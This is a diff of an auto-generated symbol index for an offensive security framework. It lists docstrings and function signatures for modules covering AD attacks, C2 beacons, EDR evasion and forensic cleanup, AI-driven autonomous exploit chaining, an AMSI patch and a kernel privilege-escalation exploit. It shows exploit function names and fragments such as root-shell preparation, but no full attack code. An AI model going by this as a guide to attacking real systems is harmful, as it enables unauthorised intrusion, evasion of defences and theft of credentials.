@@ -21,6 +21,7 @@
 
 ## modules/LazyOwnExplorer.py
 - Layer: utility
+- Doc: main.py  Autor: Gris Iscomeback Correo electrónico: grisiscomeback[at]gmail[dot]com Fecha de creación: 09/06/2024 Licenc
 - Language: py
 - Symbols:
   - `AutocompleteEntry` (class, line 29) `class AutocompleteEntry(Entry)`
@@ -53,6 +54,7 @@
 
 ## modules/adcs_attacks.py
 - Layer: utility
+- Doc: Active Directory Certificate Services (AD CS) attack module.  Implements ESC1 through ESC8 attack techniques for privile
 - Language: py
 - Symbols:
   - `CertificateTemplate` (class, line 14) `class CertificateTemplate`
@@ -73,6 +75,7 @@
 
 ## modules/agent_runner.py
 - Layer: utility
+- Doc: LazyOwn AI Agent - Ultimate Edition Mejoras: Anti-Hang (Timeout), Gestión de Memoria, Validación de Argumentos y Anti-Lo
 - Language: py
 - Symbols:
   - `configure_logging` (function, line 58) `def configure_logging(debug)`
@@ -126,6 +129,7 @@
 
 ## modules/ai_exploit_chain.py
 - Layer: utility
+- Doc: AI-Driven Exploit Chaining Engine.  Multi-step reasoning for exploit attempts. When one exploit fails the engine analyze
 - Language: py
 - Symbols:
   - `ExploitChainContext` (class, line 154) `class ExploitChainContext`
@@ -144,6 +148,7 @@
 
 ## modules/ai_fallback.py
 - Layer: utility
+- Doc: LazyOwn AI Fallback Chain ========================== Unified LLM caller with automatic fallback:  1. Groq (cloud, fast, 
 - Language: py
 - Symbols:
   - `AIResult` (class, line 89) `class AIResult`
@@ -159,6 +164,7 @@
 
 ## modules/ai_model.py
 - Layer: business_logic
+- Doc: Concrete language model backends for LazyOwn.  This module exposes the abstract :class:`AIModel` together with five conc
 - Language: py
 - Symbols:
   - `AIModel` (class, line 41) `class AIModel(ABC)`
@@ -209,12 +215,7 @@
   - `AMS1patch_E_ACCESSDENIED` (function, line 274) `void AMS1patch_E_ACCESSDENIED(HANDLE hproc)`
   - `AMS1patch_E_HANDLE` (function, line 326) `void AMS1patch_E_HANDLE(HANDLE hproc)`
   - `AMS1patch_E_OUTOFMEMORY` (function, line 378) `void AMS1patch_E_OUTOFMEMORY(HANDLE hproc)`
-  - `main` (function, line 427) `int main(int argc, char** argv)`
-  - `NTSTATUS` (function, line 19) `typedef NTSTATUS(WINAPI *NtProtectVirtualMemoryType)( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect);`
-  - `printf` (function, line 44) `printf("Failed to get procedure address\n");`
-  - `exit` (function, line 45) `exit(1);`
-  - `ZeroMemory` (function, line 72) `ZeroMemory(Patch, 100);`
-  - `lstrcatA` (function, line 75) `lstrcatA(Patch, "\x75");`
+  - `main` (function, line 428) `int main(int argc, char** argv)`
   - `NT_SUCCESS` (macro, line 11) `#define NT_SUCCESS(Status)`
 
 ## modules/amt_auth_bypass.py
@@ -227,6 +228,7 @@
 
 ## modules/apt_playbooks.py
 - Layer: utility
+- Doc: APT Playbook Engine — map public APT reports to executable Atomic Red Team chains.  This module reads enriched playbooks
 - Language: py
 - Symbols:
   - `AtomicTestRef` (class, line 41) `class AtomicTestRef`
@@ -249,6 +251,7 @@
 
 ## modules/atomic_enricher.py
 - Layer: utility
+- Doc: atomic_enricher.py — Enrich techniques.parquet with structured derived columns.  Reads  parquets/techniques.parquet  (16
 - Language: py
 - Symbols:
   - `_parse_platforms` (function, line 63) `def _parse_platforms(raw)`
@@ -265,6 +268,7 @@
 
 ## modules/auto_pivot.py
 - Layer: utility
+- Doc: Auto-Pivoting Engine for LazyOwn.  Automated lateral movement through compromised hosts: - Multi-hop SOCKS proxy chainin
 - Language: py
 - Symbols:
   - `PivotNode` (class, line 23) `class PivotNode`
@@ -294,6 +298,7 @@
 
 ## modules/auto_purple.py
 - Layer: utility
+- Doc: Purple Team Closed-Loop — honest measurement of offensive detection.  Orchestrates the cycle: execute red action -> meas
 - Language: py
 - Symbols:
   - `DetectionMethod` (class, line 65) `class DetectionMethod`
@@ -341,6 +346,7 @@
 
 ## modules/autonomous_exploit_engine.py
 - Layer: utility
+- Doc: Autonomous Exploitation Engine — AI-powered self-adapting exploit chainer.  Provides an ``AutonomousExploitEngine`` that
 - Language: py
 - Symbols:
   - `TargetProfile` (class, line 58) `class TargetProfile`
@@ -394,6 +400,7 @@
 
 ## modules/aws_attacks.py
 - Layer: utility
+- Doc: AWS privilege escalation — IAM enumeration, Lambda backdoors, STS role chaining.  Provides attack primitives for Amazon 
 - Language: py
 - Symbols:
   - `AWSConfig` (class, line 57) `class AWSConfig`
@@ -411,6 +418,7 @@
 
 ## modules/beacon_config_builder.py
 - Layer: infrastructure
+- Doc: Beacon configuration builder — wires profile engines into beacon compile-time config.  This module bridges the C2 profil
 - Language: py
 - Symbols:
   - `BeaconConfig` (class, line 44) `class BeaconConfig`
@@ -432,6 +440,7 @@
 
 ## modules/beacon_history.py
 - Layer: utility
+- Doc: Persistent beacon command/result history storage.  Owns the on-disk JSONL history for beacon results so the C2, the Flas
 - Language: py
 - Symbols:
   - `BeaconHistoryConfig` (class, line 28) `class BeaconHistoryConfig`
@@ -453,6 +462,7 @@
 
 ## modules/bitm_engine.py
 - Layer: utility
+- Doc: Browser-in-the-Middle (BitM) attack engine.  Automates ARP spoofing, transparent HTTP proxy injection, and credential ha
 - Language: py
 - Symbols:
   - `BitMState` (class, line 85) `class BitMState`
@@ -477,6 +487,7 @@
 
 ## modules/bof_registry.py
 - Layer: utility
+- Doc: Beacon Object File (BOF) registry and marketplace for LazyOwn.  Catalogs, indexes, and manages BOFs compatible with the 
 - Language: py
 - Symbols:
   - `BofPlatform` (class, line 61) `class BofPlatform(str, Enum)`
@@ -527,6 +538,7 @@
 
 ## modules/bot.py
 - Layer: utility
+- Doc: GitHub repository discovery client.  Contract: Single self-contained module that queries the GitHub search API for recen
 - Language: py
 - Symbols:
   - `BotConfig` (class, line 20) `class BotConfig`
@@ -537,6 +549,7 @@
 
 ## modules/c2_builder.py
 - Layer: presentation
+- Doc: C2 agent builder with profile-driven compilation and safe templating.  Extracted from ``LazyOwnShell.do_c2`` to reduce t
 - Language: py
 - Symbols:
   - `_resolve_go_bin` (function, line 43) `def _resolve_go_bin()`
@@ -575,6 +588,7 @@
 
 ## modules/c2_profile.py
 - Layer: utility
+- Doc: modules/c2_profile.py ====================== Malleable C2 profile system for LazyOwn.  Controls beacon HTTP behavior: he
 - Language: py
 - Symbols:
   - `SleepConfig` (class, line 53) `class SleepConfig`
@@ -613,6 +627,7 @@
 
 ## modules/c2_profile_engine.py
 - Layer: utility
+- Doc: Extended malleable C2 profile engine with TLS, DNS, SMB, and WebSocket transports.  Complements ``modules/c2_profile.py`
 - Language: py
 - Symbols:
   - `TlsProfile` (class, line 104) `class TlsProfile`
@@ -676,11 +691,13 @@
 
 ## modules/categories.py
 - Layer: utility
+- Doc: modules/categories.py ===================== cmd2 command category strings for LazyOwn.  Extracted from utils.py so they 
 - Language: py
 - Imported by: `cli/commands/automation.py`, `cli/commands/cred.py`, `cli/commands/exploit.py`, `cli/commands/lateral.py`, `cli/commands/persist.py`, `cli/commands/postexp.py`, `tests/test_categories.py`
 
 ## modules/cicd_enumerator.py
 - Layer: utility
+- Doc: CI/CD Pipeline Enumeration Module.  Enumerates CI/CD platforms (Jenkins, GitLab, GitHub Actions) for: - Exposed build lo
 - Language: py
 - Symbols:
   - `CICDFinding` (class, line 33) `class CICDFinding`
@@ -699,6 +716,7 @@
 
 ## modules/cli_auth.py
 - Layer: utility
+- Doc: CLI authentication module — login against users.json with remember-me.  Authenticates CLI operators against the same ``u
 - Language: py
 - Symbols:
   - `_load_users` (function, line 33) `def _load_users()`
@@ -724,6 +742,7 @@
 
 ## modules/cloud_enum.py
 - Layer: utility
+- Doc: Native cloud enumeration modules for AWS, Azure, and GCP.  Provides IMDS scraping, storage enumeration, IAM enumeration,
 - Language: py
 - Symbols:
   - `CloudEnumerator` (class, line 23) `class CloudEnumerator`
@@ -747,6 +766,7 @@
 
 ## modules/collab_bp.py
 - Layer: presentation
+- Doc: modules/collab_bp.py ==================== Multi-operator collaboration layer for LazyOwn.  Provides: - Server-Sent Event
 - Language: py
 - Symbols:
   - `_authenticated_operator` (function, line 85) `def _authenticated_operator()`
@@ -812,6 +832,7 @@
 
 ## modules/command_executor.py
 - Layer: utility
+- Doc: UnifiedCommandExecutor — shared shell command execution service.  Replaces scattered subprocess calls across CLI, C2, an
 - Language: py
 - Symbols:
   - `ExecutionResult` (class, line 38) `class ExecutionResult`
@@ -831,6 +852,7 @@
 
 ## modules/compliance.py
 - Layer: utility
+- Doc: modules/compliance.py ===================== Enterprise compliance engine for LazyOwn RedTeam Framework.  Capabilities: -
 - Language: py
 - Symbols:
   - `EvidenceEntry` (class, line 183) `class EvidenceEntry`
@@ -863,6 +885,7 @@
 
 ## modules/conditional_hooks.py
 - Layer: infrastructure
+- Doc: Conditional Hooks System for LazyOwn (Mythic-style triggers).  Lets operators define WHEN->THEN rules that fire automati
 - Language: py
 - Symbols:
   - `HookRule` (class, line 45) `class HookRule`
@@ -893,6 +916,7 @@
 
 ## modules/config_store.py
 - Layer: data_access
+- Doc: modules/config_store.py ======================== Thread-safe, singleton wrapper around payload.json.  Features -------- 
 - Language: py
 - Symbols:
   - `init` (function, line 56) `def init(path, watch)`
@@ -911,6 +935,7 @@
 
 ## modules/credential_reuse.py
 - Layer: utility
+- Doc: Credential Reuse Engine for LazyOwn.  Automatically suggests captured credentials for newly discovered hosts. When creds
 - Language: py
 - Symbols:
   - `ReuseCandidate` (class, line 32) `class ReuseCandidate`
@@ -934,6 +959,7 @@
 
 ## modules/cross_cloud.py
 - Layer: utility
+- Doc: Cross-cloud identity paths — multi-cloud identity federation abuse.  Implements attack paths that bridge cloud providers
 - Language: py
 - Symbols:
   - `CrossCloudConfig` (class, line 30) `class CrossCloudConfig`
@@ -950,6 +976,7 @@
 
 ## modules/cve_matcher.py
 - Layer: utility
+- Doc: modules/cve_matcher.py ======================= CVE lookup via NVD API 2.0 (no key required for basic queries).  Rate lim
 - Language: py
 - Symbols:
   - `CVEResult` (class, line 50) `class CVEResult`
@@ -969,6 +996,7 @@
 
 ## modules/dacl_abuse.py
 - Layer: infrastructure
+- Doc: DACL/SACL abuse module — ACL manipulation for AD privilege escalation.  Identifies and exploits dangerous Access Control
 - Language: py
 - Symbols:
   - `ACEntry` (class, line 67) `class ACEntry`
@@ -990,6 +1018,7 @@
 
 ## modules/dashboard_bp.py
 - Layer: presentation
+- Doc: modules/dashboard_bp.py ======================== Real-time SOC dashboard as a Flask Blueprint.  Registration (one line i
 - Language: py
 - Symbols:
   - `_require_login` (function, line 29) `def _require_login()`
@@ -1009,6 +1038,7 @@
 
 ## modules/dashboard_engine.py
 - Layer: utility
+- Doc: Live Network Map Dashboard for LazyOwn.  Provides a curses-based real-time visualization of: - Discovered hosts with ser
 - Language: py
 - Symbols:
   - `_parse_nmap_xml_services` (function, line 31) `def _parse_nmap_xml_services(sessions_dir)`
@@ -1031,6 +1061,7 @@
 
 ## modules/db.py
 - Layer: utility
+- Doc: SQLite database layer for LazyOwn -- hosts, services, vulns, loot, creds, notes.  Mirrors the Metasploit ``db_*`` workfl
 - Language: py
 - Symbols:
   - `LazyOwnDB` (class, line 147) `class LazyOwnDB`
@@ -1073,6 +1104,7 @@
 
 ## modules/delegation_attacks.py
 - Layer: utility
+- Doc: Active Directory delegation enumeration and abuse.  Enumerates and exploits Kerberos delegation configurations: unconstr
 - Language: py
 - Symbols:
   - `DelegationTarget` (class, line 32) `class DelegationTarget`
@@ -1091,12 +1123,14 @@
 
 ## modules/detailed_search.py
 - Layer: utility
+- Doc: main.py  Autor: Gris Iscomeback Correo electrónico: grisiscomeback[at]gmail[dot]com Fecha de creación: 09/06/2024 Licenc
 - Language: py
 - Symbols:
   - `obtener_informacion` (function, line 38) `def obtener_informacion(url)`
 
 ## modules/detection_feed.py
 - Layer: utility
+- Doc: Dynamic detection feed for the Detection Oracle.  The :class:`DetectionOracle` in ``modules/detection_oracle.py`` uses 1
 - Language: py
 - Symbols:
   - `FeedResult` (class, line 63) `class FeedResult`
@@ -1117,6 +1151,7 @@
 
 ## modules/detection_oracle.py
 - Layer: utility
+- Doc: modules/detection_oracle.py ============================ Blue Team Mirror — predicts detection probability for a given a
 - Language: py
 - Symbols:
   - `SigmaRule` (class, line 49) `class SigmaRule`
@@ -1141,6 +1176,7 @@
 
 ## modules/dns_beacon.py
 - Layer: utility
+- Doc: DNS Beacon — covert C2 channel via DNS tunneling.  Supports A/AAAA/TXT record tunneling. The beacon encodes commands and
 - Language: py
 - Symbols:
   - `DNSBeacon` (class, line 23) `class DNSBeacon`
@@ -1167,6 +1203,7 @@
 
 ## modules/domain_dominance.py
 - Layer: business_logic
+- Doc: Domain Dominance Engine — automated Active Directory takeover.  Provides a ``DomainDominance`` engine that orchestrates 
 - Language: py
 - Symbols:
   - `DomainInfo` (class, line 49) `class DomainInfo`
@@ -1203,6 +1240,7 @@
 
 ## modules/dotnet_payload.py
 - Layer: utility
+- Doc: .NET/C# payload generation — execute-assembly, inline-assembly, Roslyn compilation.  Provides DotNetPayloadFactory for g
 - Language: py
 - Symbols:
   - `DotNetPayloadConfig` (class, line 298) `class DotNetPayloadConfig`
@@ -1221,6 +1259,7 @@
 
 ## modules/dpapi_harvester.py
 - Layer: presentation
+- Doc: DPAPI credential decryption and harvesting engine.  Supports offline decryption of: - Master keys (Preferred file, local
 - Language: py
 - Symbols:
   - `DPAPICredential` (class, line 44) `class DPAPICredential`
@@ -1251,6 +1290,7 @@
 
 ## modules/edr_detector.py
 - Layer: utility
+- Doc: EDR/AV Detection and Evasion Profiling Engine.  Detects endpoint security products (AV, EDR, XDR) on Windows targets thr
 - Language: py
 - Symbols:
   - `EDRFinding` (class, line 174) `class EDRFinding`
@@ -1279,6 +1319,7 @@
 
 ## modules/engagement_hooks.py
 - Layer: utility
+- Doc: modules/engagement_hooks.py — Engagement narration and notification fabric =============================================
 - Language: py
 - Symbols:
   - `_safe_str` (function, line 76) `def _safe_str(value, maxlen)`
@@ -1328,6 +1369,7 @@
 
 ## modules/entra_id_attacks.py
 - Layer: utility
+- Doc: Azure AD / Entra ID attack module — Graph API abuse, OAuth consent grants, device code phishing.  Provides attack primit
 - Language: py
 - Symbols:
   - `EntraIDConfig` (class, line 56) `class EntraIDConfig`
@@ -1346,6 +1388,7 @@
 
 ## modules/estorides_importer.py
 - Layer: utility
+- Doc: estorides_importer ================== Bidirectional bridge between Estorides (passive OSINT) and LazyOwn (active pentest
 - Language: py
 - Symbols:
   - `EstoridesEntity` (class, line 84) `class EstoridesEntity`
@@ -1393,6 +1436,7 @@
 
 ## modules/evasion_engine.py
 - Layer: utility
+- Doc: Advanced Evasion Engine for LazyOwn C2 operations.  Provides dynamic C2 profile generation, traffic morphing, JA3/JA4 fi
 - Language: py
 - Symbols:
   - `TrafficMorphConfig` (class, line 25) `class TrafficMorphConfig`
@@ -1423,6 +1467,7 @@
 
 ## modules/evasive_payloads.py
 - Layer: utility
+- Doc: Advanced evasive payload generation with multiple obfuscation strategies.  Provides polymorphic payload generation that 
 - Language: py
 - Symbols:
   - `EvasivePayloadGenerator` (class, line 18) `class EvasivePayloadGenerator`
@@ -1445,6 +1490,7 @@
 
 ## modules/event_bus.py
 - Layer: infrastructure
+- Doc: UnifiedEventBus — central nervous system connecting all LazyOwn components.  Replaces the fragmented event systems (coll
 - Language: py
 - Symbols:
   - `EventCategory` (class, line 47) `class EventCategory(str, Enum)`
@@ -1493,6 +1539,7 @@
 
 ## modules/event_consumers.py
 - Layer: infrastructure
+- Doc: Event Consumers — reactive layer that makes EventBus events drive real actions.  These subscribers turn the EventBus fro
 - Language: py
 - Symbols:
   - `_load_payload` (function, line 43) `def _load_payload()`
@@ -1518,6 +1565,7 @@
 
 ## modules/event_engine.py
 - Layer: infrastructure
+- Doc: LazyOwn Event Engine ==================== Tails sessions/LazyOwn_session_report.csv for new command executions, matches 
 - Language: py
 - Symbols:
   - `load_rules` (function, line 98) `def load_rules()`
@@ -1538,7 +1586,7 @@
 
 ## modules/exp.c
 - Layer: utility
-- Doc: gcc exp.c -o exp -l mnl -l nftnl -w define _GNU_SOURCE include <arpa/inet.h> include <sched.h> include <unistd.h> includ
+- Doc: gcc exp.c -o exp -l mnl -l nftnl -w
 - Language: c
 - Symbols:
   - `keyring_payload` (struct, line 120)
@@ -1550,92 +1598,59 @@
   - `user_rule_t` (struct, line 105)
   - `nft_trans_phase` (enum, line 77)
   - `key_serial_t` (type_alias, line 135) `typedef int32_t key_serial_t;`
-  - `add_key` (function, line 144) `static inline key_serial_t add_key(const char *type, const char *description, const void *payload...`
-  - `keyctl` (function, line 150) `static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long ar...`
-  - `bye` (function, line 154) `void bye(char *info)`
-  - `do_error_exit` (function, line 160) `void do_error_exit(char *info)`
-  - `bye2` (function, line 166) `void bye2(char *info, char *arg)`
-  - `spray_keyring` (function, line 171) `key_serial_t *spray_keyring(uint32_t start, uint32_t spray_size)`
-  - `spray_keyring_list_del_purpose` (function, line 189) `key_serial_t *spray_keyring_list_del_purpose(uint32_t spray_size, uint64_t next, uint64_t prev, u...`
-  - `spray_keyring_list_overwrite_purpose` (function, line 213) `key_serial_t *spray_keyring_list_overwrite_purpose(uint32_t spray_size, uint64_t len, uint64_t of...`
-  - `get_keyring_leak` (function, line 247) `int get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size)`
-  - `awake_partial_keys` (function, line 270) `void awake_partial_keys(key_serial_t *id_buffer, uint32_t idx)`
-  - `release_keys` (function, line 276) `void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size)`
-  - `release_partial_keys` (function, line 289) `void release_partial_keys(key_serial_t *id_buffer, int i)`
-  - `unshare_setup` (function, line 295) `void unshare_setup(uid_t uid, gid_t gid)`
-  - `set_stable_table_and_set` (function, line 320) `void set_stable_table_and_set(struct mnl_socket* nl, const char *name)`
-  - `set_trigger_set_and_overwrite` (function, line 384) `void set_trigger_set_and_overwrite(struct mnl_socket* nl, const char *name, const char *set_name)`
-  - `set_cpu_affinity` (function, line 437) `void set_cpu_affinity(int cpu_n, pid_t pid)`
-  - `spray_mqueue` (function, line 447) `void spray_mqueue(mqd_t mqdes, char *msgptr, int spray_size)`
-  - `gather_mqueue` (function, line 462) `int gather_mqueue(mqd_t mqdes, int gather_size)`
-  - `gather_mqueue_nosave` (function, line 484) `int gather_mqueue_nosave(mqd_t mqdes, int gather_size)`
-  - `spray_msg_msg` (function, line 495) `void spray_msg_msg(unsigned int size, unsigned int amount, int qid)`
-  - `io_uring_setup` (function, line 519) `static inline int io_uring_setup(uint32_t entries, struct io_uring_params *p)`
-  - `io_uring_register` (function, line 523) `static inline int io_uring_register(int fd, unsigned int opcode, void *arg, unsigned int nr_args)`
-  - `spray_uring` (function, line 527) `struct fd_uring *spray_uring(uint32_t spray_size, struct fd_uring *fd_buffer)`
-  - `release_uring` (function, line 545) `void release_uring(struct fd_uring *fd_buffer, uint32_t buffer_size)`
-  - `release_partial_uring` (function, line 553) `void release_partial_uring(struct fd_uring *fd_buffer, uint32_t buffer_idx)`
-  - `prepare_root_shell` (function, line 558) `void prepare_root_shell(void)`
-  - `create_dummy_file` (function, line 563) `void create_dummy_file(void)`
-  - `create_priv_file` (function, line 571) `void create_priv_file(void)`
-  - `write_new_modprobe` (function, line 581) `void write_new_modprobe()`
-  - `setup_modprobe_payload` (function, line 600) `void setup_modprobe_payload()`
-  - `userland_T` (function, line 604) `void userland_T(int *sema)`
-  - `sema_up` (function, line 609) `void sema_up(int *sema)`
-  - `sema_down` (function, line 614) `void sema_down(int *sema)`
-  - `main` (function, line 619) `int main(int argc, char ** argv)`
-  - `syscall` (function, line 148) `return syscall(__NR_add_key, type, description, payload, plen, ringid);`
-  - `puts` (function, line 157) `puts(info);`
-  - `exit` (function, line 158) `exit(-2);`
-  - `printf` (function, line 169) `printf(info, arg);`
-  - `snprintf` (function, line 181) `snprintf(key_desc, KEY_DESC_MAX_SIZE, "SPRAY-RING-%03du", i);`
-  - `memcpy` (function, line 197) `memcpy(temp+0x0, &next, 8);`
-  - `free` (function, line 286) `free(id_buffer);`
-  - `unshare` (function, line 301) `unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);`
-  - `write` (function, line 305) `write(temp, "deny", strlen("deny"));`
-  - `close` (function, line 306) `close(temp);`
-  - `nftnl_table_set_str` (function, line 331) `nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);`
-  - `nftnl_table_set_u32` (function, line 332) `nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);`
-  - `nftnl_set_set_str` (function, line 336) `nftnl_set_set_str(set_stable, NFTNL_SET_TABLE, table_name);`
-  - `nftnl_set_set_u32` (function, line 338) `nftnl_set_set_u32(set_stable, NFTNL_SET_KEY_LEN, 1);`
-  - `nftnl_batch_begin` (function, line 351) `nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);`
-  - `mnl_nlmsg_batch_next` (function, line 353) `mnl_nlmsg_batch_next(batch);`
-  - `nftnl_table_nlmsg_build_payload` (function, line 360) `nftnl_table_nlmsg_build_payload(nlh, table);`
-  - `nftnl_set_nlmsg_build_payload` (function, line 367) `nftnl_set_nlmsg_build_payload(nlh, set_stable);`
-  - `nftnl_set_free` (function, line 368) `nftnl_set_free(set_stable);`
-  - `nftnl_batch_end` (function, line 370) `nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);`
-  - `err` (function, line 375) `err(1, "mnl_socket_open");`
-  - `nftnl_expr_set_str` (function, line 403) `nftnl_expr_set_str(exprs[exprid], NFTNL_EXPR_LOOKUP_SET, "set_stable");`
-  - `nftnl_expr_set_u32` (function, line 404) `nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);`
-  - `nftnl_set_add_expr` (function, line 405) `nftnl_set_add_expr(set_trigger, exprs[exprid]);`
-  - `CPU_ZERO` (function, line 440) `CPU_ZERO(&set);`
-  - `CPU_SET` (function, line 442) `CPU_SET(cpu_n, &set);`
-  - `mq_receive` (function, line 491) `mq_receive(mqdes, (char*) &msg, BUFFER, NULL);`
-  - `memset` (function, line 504) `memset(spray->mtext, 0x41, size - 0x30);`
-  - `perror` (function, line 513) `perror("msgsend failure");`
-  - `system` (function, line 578) `system("gcc -o /tmp/shell /tmp/shell.c -w");`
-  - `read` (function, line 588) `read(fd_modprobe, modprobe_name, 14);`
-  - `setvbuf` (function, line 622) `setvbuf(stdin, 0, 2, 0);`
-  - `sleep` (function, line 646) `sleep(1);`
-  - `execve` (function, line 649) `execve("/tmp/dummy", NULL, NULL);`
+  - `add_key` (function, line 147) `static inline key_serial_t add_key(const char *type, const char *description, const void *payload...`
+  - `keyctl` (function, line 151) `static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long ar...`
+  - `bye` (function, line 155) `void bye(char *info)`
+  - `do_error_exit` (function, line 161) `void do_error_exit(char *info)`
+  - `bye2` (function, line 167) `void bye2(char *info, char *arg)`
+  - `spray_keyring` (function, line 172) `key_serial_t *spray_keyring(uint32_t start, uint32_t spray_size)`
+  - `spray_keyring_list_del_purpose` (function, line 190) `key_serial_t *spray_keyring_list_del_purpose(uint32_t spray_size, uint64_t next, uint64_t prev, u...`
+  - `spray_keyring_list_overwrite_purpose` (function, line 214) `key_serial_t *spray_keyring_list_overwrite_purpose(uint32_t spray_size, uint64_t len, uint64_t of...`
+  - `get_keyring_leak` (function, line 248) `int get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size)`
+  - `awake_partial_keys` (function, line 271) `void awake_partial_keys(key_serial_t *id_buffer, uint32_t idx)`
+  - `release_keys` (function, line 279) `void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size)`
+  - `release_partial_keys` (function, line 290) `void release_partial_keys(key_serial_t *id_buffer, int i)`
+  - `unshare_setup` (function, line 297) `void unshare_setup(uid_t uid, gid_t gid)`
+  - `set_stable_table_and_set` (function, line 322) `void set_stable_table_and_set(struct mnl_socket* nl, const char *name)`
+  - `set_trigger_set_and_overwrite` (function, line 385) `void set_trigger_set_and_overwrite(struct mnl_socket* nl, const char *name, const char *set_name)`
+  - `set_cpu_affinity` (function, line 438) `void set_cpu_affinity(int cpu_n, pid_t pid)`
+  - `spray_mqueue` (function, line 448) `void spray_mqueue(mqd_t mqdes, char *msgptr, int spray_size)`
+  - `gather_mqueue` (function, line 463) `int gather_mqueue(mqd_t mqdes, int gather_size)`
+  - `gather_mqueue_nosave` (function, line 485) `int gather_mqueue_nosave(mqd_t mqdes, int gather_size)`
+  - `spray_msg_msg` (function, line 496) `void spray_msg_msg(unsigned int size, unsigned int amount, int qid)`
+  - `io_uring_setup` (function, line 520) `static inline int io_uring_setup(uint32_t entries, struct io_uring_params *p)`
+  - `io_uring_register` (function, line 524) `static inline int io_uring_register(int fd, unsigned int opcode, void *arg, unsigned int nr_args)`
+  - `spray_uring` (function, line 529) `struct fd_uring *spray_uring(uint32_t spray_size, struct fd_uring *fd_buffer)`
+  - `release_uring` (function, line 546) `void release_uring(struct fd_uring *fd_buffer, uint32_t buffer_size)`
+  - `release_partial_uring` (function, line 554) `void release_partial_uring(struct fd_uring *fd_buffer, uint32_t buffer_idx)`
+  - `prepare_root_shell` (function, line 559) `void prepare_root_shell(void)`
+  - `create_dummy_file` (function, line 564) `void create_dummy_file(void)`
+  - `create_priv_file` (function, line 572) `void create_priv_file(void)`
+  - `write_new_modprobe` (function, line 582) `void write_new_modprobe()`
+  - `setup_modprobe_payload` (function, line 601) `void setup_modprobe_payload()`
+  - `userland_T` (function, line 605) `void userland_T(int *sema)`
+  - `sema_up` (function, line 610) `void sema_up(int *sema)`
+  - `sema_down` (function, line 615) `void sema_down(int *sema)`
+  - `main` (function, line 620) `int main(int argc, char ** argv)`
   - `_GNU_SOURCE` (macro, line 2) `#define _GNU_SOURCE`
-  - `MQUEUE_NUM` (macro, line 48) `#define MQUEUE_NUM`
-  - `INBOUND` (macro, line 50) `#define INBOUND`
+  - `MQUEUE_NUM` (macro, line 49) `#define MQUEUE_NUM`
+  - `INBOUND` (macro, line 52) `#define INBOUND`
   - `OUTBOUND` (macro, line 53) `#define OUTBOUND`
   - `DESC_MAX` (macro, line 54) `#define DESC_MAX`
-  - `BUFFER` (macro, line 55) `#define BUFFER`
+  - `BUFFER` (macro, line 56) `#define BUFFER`
   - `NAMELEN` (macro, line 57) `#define NAMELEN`
   - `ERROR_PREFIX` (macro, line 58) `#define ERROR_PREFIX`
-  - `KEY_DESC_MAX_SIZE` (macro, line 59) `#define KEY_DESC_MAX_SIZE`
-  - `PREFIX_BUF_LEN` (macro, line 61) `#define PREFIX_BUF_LEN`
+  - `KEY_DESC_MAX_SIZE` (macro, line 60) `#define KEY_DESC_MAX_SIZE`
+  - `PREFIX_BUF_LEN` (macro, line 62) `#define PREFIX_BUF_LEN`
   - `RCU_HEAD_LEN` (macro, line 63) `#define RCU_HEAD_LEN`
-  - `SPRAY_KEY_SIZE` (macro, line 64) `#define SPRAY_KEY_SIZE`
-  - `PHYSMAP_MASK` (macro, line 66) `#define PHYSMAP_MASK`
-  - `SPRAY_SIZE` (macro, line 68) `#define SPRAY_SIZE`
-  - `SPRAY_NB_ENTRIES` (macro, line 70) `#define SPRAY_NB_ENTRIES`
+  - `SPRAY_KEY_SIZE` (macro, line 65) `#define SPRAY_KEY_SIZE`
+  - `PHYSMAP_MASK` (macro, line 67) `#define PHYSMAP_MASK`
+  - `SPRAY_SIZE` (macro, line 69) `#define SPRAY_SIZE`
+  - `SPRAY_NB_ENTRIES` (macro, line 71) `#define SPRAY_NB_ENTRIES`
 
 ## modules/exploit_chain.py
 - Layer: utility
+- Doc: Autonomous exploitation chain engine.  Orchestrates the full kill chain from recon through exploitation to post-exploita
 - Language: py
 - Symbols:
   - `ServiceInfo` (class, line 29) `class ServiceInfo`
@@ -1661,6 +1676,7 @@
 
 ## modules/exploit_recommender.py
 - Layer: utility
+- Doc: AI-Powered Exploit Recommendation Engine for LazyOwn.  Queries NVD API for CVEs, matches against Exploit-DB, ranks explo
 - Language: py
 - Symbols:
   - `ExploitMatch` (class, line 35) `class ExploitMatch`
@@ -1684,6 +1700,7 @@
 
 ## modules/exploitgym_gym.py
 - Layer: utility
+- Doc: ExploitGym integration — real-world vulnerability-to-exploit benchmark.  Wraps the sunblaze-ucb/exploitgym harness (cont
 - Language: py
 - Symbols:
   - `_ensure_dir` (function, line 56) `def _ensure_dir()`
@@ -1756,6 +1773,7 @@
 
 ## modules/forensic_cleaner.py
 - Layer: utility
+- Doc: Forensic artifact cleaner — Prefetch, Shimcache, Amcache, MFT/USN cleanup.  Removes evidence of execution from Windows f
 - Language: py
 - Symbols:
   - `ForensicCleanerConfig` (class, line 23) `class ForensicCleanerConfig`
@@ -1770,6 +1788,7 @@
 
 ## modules/gcp_attacks.py
 - Layer: utility
+- Doc: GCP privilege escalation — service account impersonation, Cloud Functions, GCS enumeration.  Provides attack primitives 
 - Language: py
 - Symbols:
   - `GCPConfig` (class, line 57) `class GCPConfig`
@@ -1794,6 +1813,7 @@
 
 ## modules/gpo_abuse.py
 - Layer: infrastructure
+- Doc: GPO abuse module — Group Policy Object manipulation for AD persistence and privilege escalation.  Exploits Group Policy 
 - Language: py
 - Symbols:
   - `GPOInfo` (class, line 54) `class GPOInfo`
@@ -1827,6 +1847,7 @@
 
 ## modules/hash_cracker.py
 - Layer: utility
+- Doc: Hash cracking pipeline — John the Ripper and Hashcat integration.  Parses hash formats from secretsdump output, identifi
 - Language: py
 - Symbols:
